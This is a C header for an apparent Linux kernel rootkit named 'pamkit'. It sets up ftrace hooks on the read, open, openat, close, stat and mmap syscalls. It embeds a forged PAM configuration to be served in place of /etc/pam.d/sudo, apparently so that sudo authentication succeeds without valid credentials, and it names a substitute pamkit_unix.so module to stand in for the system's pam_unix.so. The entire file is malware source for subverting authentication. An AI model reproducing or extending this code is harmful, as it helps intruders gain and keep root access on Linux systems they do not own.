#ifndef _SYS_H
#define _SYS_H

#include <linux/module.h>
#include <linux/ftrace.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/spinlock.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/compiler.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/mman.h>
#include <linux/io.h>

#include "util/read_table.h"

//On x86-64 systems, from kernel version 4.17.0 onwards, the syscall arguments are passed
//  via the pt_regs struct, which contains a copy of the register values.
#if defined(CONFIG_X86_64) && (KERNEL_VERSION(4, 17, 0) <= LINUX_VERSION_CODE)
#define PTREGS_STUBS 1
#endif

#pragma GCC optimize("-fno-optimize-sibling-calls")

#define PAMKIT_PREVENT_PAM_MAPPING -1

#define VIRTUAL_FD 9999
static char* const virtual_gdm_config_file = "#%PAM-1.0\n\n# Set up user limits from /etc/security/limits.conf.\nsession    required   pam_limits.so\n\nsession    required   pam_env.so readenv=1 user_readenv=0\nsession    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0\n\nauth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/sudo sense=allow onerr=succeed quiet\n@include common-auth\n@include common-account\n@include common-session-noninteractive";
#define FILE_SIZE (strlen(virtual_gdm_config_file))

#define _STR_SIZE(x) (sizeof(char) * (strlen(x)+1))

#define ETC_PAMD_SUDO "/etc/pam.d/sudo"
#define USR_LIB_PAMD_SUDO "/usr/lib/pam.d/sudo"

#define PAMKIT_UNIX_PATH "/DEFINE/pamkit_unix.so"
#define PAM_UNIX_DEFAULT_PATH "/lib/x86_64-linux-gnu/security/pam_unix.so"

#define PAMKIT_UNIX_PATH_SIZE (strlen(PAMKIT_UNIX_PATH) + 1)
#define PAM_UNIX_DEFAULT_PATH_SIZE (strlen(PAM_UNIX_DEFAULT_PATH) + 1)

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .hook_function = (_hook),        \
    .orig_function = (_orig),        \
}

#ifdef PTREGS_STUBS
//https://syscalls64.paolostivanin.com/
static asmlinkage long (*orig_read)(const struct pt_regs *pt_regs);
static asmlinkage long (*orig_open)(const struct pt_regs *pt_regs);
static asmlinkage long (*orig_openat)(const struct pt_regs *pt_regs);
static asmlinkage long (*orig_close)(const struct pt_regs *pt_regs);
static asmlinkage long (*orig_newfstatat)(const struct pt_regs *pt_regs);
static asmlinkage long (*orig_mmap)(const struct pt_regs *pt_regs);
#else
static asmlinkage long (*orig_read)(unsigned int fd, char __user *buf, size_t count);
static asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);
static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
static asmlinkage long (*orig_close)(int fd);
static asmlinkage long (*orig_newfstatat)(int dfd, const char __user *filename, struct stat __user *statbuf, int flag);
static asmlinkage long (*orig_mmap)(unsigned long addr, unsigned long len, int prot, int flags, int fd, long off);
#endif

#ifdef PTREGS_STUBS
#define ORIG_READ orig_read(pt_regs)
#else
#define ORIG_READ orig_read(fd, buf, count)
#endif

#ifdef PTREGS_STUBS
#define ORIG_OPEN orig_open(pt_regs)
#else
#define ORIG_OPEN orig_open(filename, flags, mode)
#endif

#ifdef PTREGS_STUBS
#define ORIG_OPENAT orig_openat(pt_regs)
#else
#define ORIG_OPENAT orig_openat(dfd, filename, flags, mode)
#endif

#ifdef PTREGS_STUBS
#define ORIG_CLOSE orig_close(pt_regs)
#else
#define ORIG_CLOSE orig_close(fd)
#endif

#ifdef PTREGS_STUBS
#define ORIG_NEWFSTATAT orig_newfstatat(pt_regs)
#else
#define ORIG_NEWFSTATAT orig_newfstatat(dfd, filename, statbuf, flag)
#endif

#ifdef PTREGS_STUBS
#define ORIG_MMAP orig_mmap(pt_regs)
#else
#define ORIG_MMAP orig_mmap(addr, len, prot, flags, fd, off)
#endif


#endif /* _SYS_H */
